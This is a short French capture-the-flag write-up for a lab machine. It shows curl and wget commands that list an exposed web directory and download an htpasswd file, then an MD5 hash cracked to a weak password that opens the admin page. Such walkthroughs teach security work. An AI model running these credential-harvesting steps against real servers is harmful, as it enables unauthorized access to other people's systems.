FLAG 1 – htpasswd Exposé

Lors de l’énumération du serveur, on trouve un répertoire accessible : http://192.168.1.47/whatever/

En listant son contenu : curl -s http://192.168.1.47/whatever/ | grep href

On voit : htpasswd

On télécharge le fichier : wget http://192.168.1.47/whatever/htpasswd

root:437394baff5aa33daa618be47b75cb49

<img width="629" height="570" alt="517852200-46e18927-cc14-480c-abf7-3a4380230692" src="https://github.com/user-attachments/assets/cd23a484-c215-4e00-95fc-c5219d98ac71" />

Le hash ressemble à une empreinte MD5

437394baff5aa33daa618be47b75cb49 : qwerty123@

On obtient le mot de passe : qwerty123@

On se connecte à la page admin username : admin password : qwerty123@
<img width="726" height="739" alt="517852416-288a341b-d412-4b68-8f11-f6aee9c20d86" src="https://github.com/user-attachments/assets/6d623643-c89f-47b0-9a06-20bd48a0ebcf" />
